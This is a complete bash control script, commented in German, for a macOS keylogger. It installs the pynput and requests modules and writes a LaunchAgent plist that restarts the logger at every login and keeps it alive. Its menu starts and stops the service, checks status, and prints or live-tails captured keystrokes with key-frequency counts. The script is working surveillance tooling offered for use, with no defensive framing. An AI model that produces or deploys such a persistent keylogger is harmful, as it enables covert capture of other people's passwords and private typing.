#!/bin/bash
# keylogger-ctl.sh – alles-in-einem Steuerung für den Keylogger
# Erkennt Benutzer, Python, Skript-Pfad automatisch, erzeugt plist selbst.

# ---------- Automatische Erkennung ----------
USER_NAME="$(whoami)"
HOME_DIR="$HOME"
PLIST="$HOME_DIR/Library/LaunchAgents/com.user.keylogger.plist"
LABEL="com.user.keylogger"
OUTLOG="/tmp/keylogger.out.log"
ERRLOG="/tmp/keylogger.err.log"
LOG_DIR="$HOME_DIR/Documents/KeyLogs"
REQUIRED_PY_MODULES=("requests" "pynput")

# Python-Interpreter finden (bevorzugt Homebrew, sonst System)
find_python() {
    for p in \
        /opt/homebrew/bin/python3 \
        /usr/local/bin/python3 \
        /usr/bin/python3
    do
        [ -x "$p" ] && { echo "$p"; return 0; }
    done
    command -v python3 2>/dev/null && return 0
    return 1
}
PYTHON_BIN="$(find_python)"

# keylogger.py finden
find_py() {
    for cand in \
        "$HOME_DIR/Downloads/keylogger.py" \
        "$HOME_DIR/Scripts/keylogger.py" \
        "$HOME_DIR/Desktop/keylogger.py" \
	"$HOME_DIR/Documents/keylogger.py" \
        "$HOME_DIR/Downloads/Keylogger/keylogger.py"
    do
        [ -f "$cand" ] && { echo "$cand"; return 0; }
    done
    return 1
}
PY="$(find_py)"

# ---------- Abhängigkeiten ----------
module_installed() {
    [ -n "$PYTHON_BIN" ] || return 1
    "$PYTHON_BIN" - "$1" <<'PYEOF' >/dev/null 2>&1
import importlib, sys
try:
    importlib.import_module(sys.argv[1])
except Exception:
    sys.exit(1)
PYEOF
}

ensure_dependencies() {
    if [ -z "$PYTHON_BIN" ]; then
        echo "[!] Kein python3 gefunden. Bitte installieren: brew install python"
        return 1
    fi
    echo "[i] Python: $PYTHON_BIN"

    local missing=()
    for m in "${REQUIRED_PY_MODULES[@]}"; do
        if module_installed "$m"; then
            echo "[✓] Modul vorhanden: $m"
        else
            echo "[!] Fehlt: $m"
            missing+=("$m")
        fi
    done

    [ ${#missing[@]} -eq 0 ] && { echo "[✓] Alle Abhängigkeiten vorhanden."; return 0; }

    if ! "$PYTHON_BIN" -m pip --version >/dev/null 2>&1; then
        echo "[!] pip nicht verfügbar. Versuche ensurepip…"
        "$PYTHON_BIN" -m ensurepip --upgrade >/dev/null 2>&1 || true
    fi
    if ! "$PYTHON_BIN" -m pip --version >/dev/null 2>&1; then
        echo "[!] pip weiterhin nicht verfügbar. Bitte manuell installieren."
        return 1
    fi

    echo
    echo "[i] Installiere fehlende Module: ${missing[*]}"
    if "$PYTHON_BIN" -m pip install --user "${missing[@]}"; then
        echo "[✓] Installation abgeschlossen."
    else
        echo "[!] Installation fehlgeschlagen."
        return 1
    fi

    local still=()
    for m in "${missing[@]}"; do
        module_installed "$m" || still+=("$m")
    done
    if [ ${#still[@]} -gt 0 ]; then
        echo "[!] Weiterhin fehlend: ${still[*]}"
        return 1
    fi
    echo "[✓] Alle Abhängigkeiten vorhanden."
    return 0
}

# ---------- plist erzeugen ----------
write_plist() {
    if [ -z "$PY" ] || [ -z "$PYTHON_BIN" ]; then
        echo "[!] Kann plist nicht erzeugen – Python oder Skript fehlt."
        return 1
    fi
    mkdir -p "$HOME_DIR/Library/LaunchAgents"
    cat > "$PLIST" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>$LABEL</string>
    <key>ProgramArguments</key>
    <array>
        <string>$PYTHON_BIN</string>
        <string>$PY</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>$OUTLOG</string>
    <key>StandardErrorPath</key>
    <string>$ERRLOG</string>
</dict>
</plist>
EOF
    echo "[✓] plist geschrieben: $PLIST"
}

# ---------- launchd-Steuerung ----------
launchd_loaded() {
    launchctl list 2>/dev/null | grep -q "$LABEL"
}

launchd_pid() {
    launchctl list 2>/dev/null | awk -v l="$LABEL" '$3==l {print $1}'
}

status_line() {
    if launchd_loaded; then
        local pid; pid="$(launchd_pid)"
        echo "● LÄUFT (launchd, PID ${pid:-–})"
    elif [ -f /tmp/keylogger.pid ] && kill -0 "$(cat /tmp/keylogger.pid 2>/dev/null)" 2>/dev/null; then
        echo "● LÄUFT (nohup, PID $(cat /tmp/keylogger.pid))"
    else
        echo "○ GESTOPPT"
    fi
}

start_kl() {
    if [ -z "$PY" ]; then
        echo "[!] keylogger.py nicht gefunden."
        return
    fi
    if launchd_loaded; then
        echo "[i] Läuft bereits über launchd."
        return
    fi

    echo "[i] Prüfe Abhängigkeiten…"
    ensure_dependencies || { echo "[!] Start abgebrochen."; return; }

    write_plist || return

    launchctl load "$PLIST" 2>/dev/null || \
        launchctl bootstrap "gui/$(id -u)" "$PLIST" 2>/dev/null

    sleep 1
    if launchd_loaded; then
        echo "[✓] Gestartet über launchd (Auto-Start bei Login aktiv)."
    else
        echo "[!] launchctl load fehlgeschlagen. Siehe $ERRLOG."
        tail -n 5 "$ERRLOG" 2>/dev/null
    fi
}

stop_kl() {
    if launchd_loaded; then
        launchctl unload "$PLIST" 2>/dev/null || \
            launchctl bootout "gui/$(id -u)/$LABEL" 2>/dev/null
        echo "[✓] launchd-Dienst gestoppt (kein Auto-Start mehr)."
    fi
    # Falls noch nohup-Prozess läuft
    if [ -f /tmp/keylogger.pid ]; then
        local pid; pid="$(cat /tmp/keylogger.pid 2>/dev/null)"
        [ -n "$pid" ] && kill "$pid" 2>/dev/null
        rm -f /tmp/keylogger.pid
        echo "[✓] nohup-Prozess beendet."
    fi
}

show_status() {
    echo "═══════════════════════════════════════"
    echo " STATUS"
    echo "═══════════════════════════════════════"
    echo " Benutzer:  $USER_NAME"
    echo " Dienst:    $(status_line)"
    echo " Python:    ${PYTHON_BIN:-<nicht gefunden>}"
    echo " Skript:    ${PY:-<nicht gefunden>}"
    echo " plist:     $PLIST"
    echo " Logs:      $LOG_DIR"
    [ -s "$ERRLOG" ] && { echo " Letzte Fehler:"; tail -n 3 "$ERRLOG" | sed 's/^/   /'; }
    echo
}

# ---------- Verlauf ----------
show_history() {
    [ -d "$LOG_DIR" ] || { echo "[!] Kein Log-Ordner: $LOG_DIR"; return; }
    local latest; latest="$(ls -t "$LOG_DIR"/keys_*.log 2>/dev/null | head -n1)"
    [ -z "$latest" ] && { echo "[!] Noch keine Logdatei."; return; }

    echo "═══════════════════════════════════════"
    echo " TASTENDRÜCKE – $(basename "$latest")"
    echo "═══════════════════════════════════════"
    "$PYTHON_BIN" - "$latest" <<'PYEOF'
import json, sys
from collections import Counter
rows = []
with open(sys.argv[1], encoding="utf-8") as f:
    for line in f:
        line = line.strip()
        if line:
            try: rows.append(json.loads(line))
            except Exception: pass
presses = [r for r in rows if r.get("event") == "press"]
print(f" Gesamt: {len(rows)} Einträge | Tastendrücke: {len(presses)}\n")
print(f"{'Zeit':<10} {'Taste':<20}")
print("-" * 32)
for r in presses[-40:]:
    k = r.get("key", "").replace("Key.", "").replace("'", "")
    print(f"{r.get('time',''):<10} {k:<20}")
print("\n Häufigste Tasten:")
for k, v in Counter(r.get("key","") for r in presses).most_common(10):
    print(f"   {k.replace('Key.','').replace(chr(39),''):<20} {v}x")
PYEOF
    echo
}

follow_live() {
    local latest; latest="$(ls -t "$LOG_DIR"/keys_*.log 2>/dev/null | head -n1)"
    [ -z "$latest" ] && { echo "[!] Keine Logdatei."; return; }
    echo "[i] Live: $latest  (Strg+C zum Beenden)"
    tail -f "$latest"
}

# ---------- Menü ----------
while true; do
    clear
    echo "═══════════════════════════════════════"
    echo "   KEYLOGGER STEUERUNG"
    echo "═══════════════════════════════════════"
    echo " Benutzer: $USER_NAME"
    echo " Status:   $(status_line)"
    echo " Skript:   ${PY:-<nicht gefunden>}"
    echo "───────────────────────────────────────"
    echo "  1) Starten (mit Auto-Start bei Login)"
    echo "  2) Stoppen (Auto-Start deaktivieren)"
    echo "  3) Status"
    echo "  4) Verlauf (Übersicht)"
    echo "  5) Live-Verlauf"
    echo "  6) Abhängigkeiten prüfen/installieren"
    echo "  7) plist neu erzeugen"
    echo "  q) Beenden"
    echo "───────────────────────────────────────"
    read -rp " Auswahl: " choice
    echo
    case "$choice" in
        1) start_kl; read -rp "Enter…" _ ;;
        2) stop_kl;  read -rp "Enter…" _ ;;
        3) show_status; read -rp "Enter…" _ ;;
        4) show_history; read -rp "Enter…" _ ;;
        5) follow_live ;;
        6) ensure_dependencies; read -rp "Enter…" _ ;;
        7) write_plist; read -rp "Enter…" _ ;;
        q|Q) exit 0 ;;
        *) echo "[!] Ungültig."; sleep 1 ;;
    esac
done
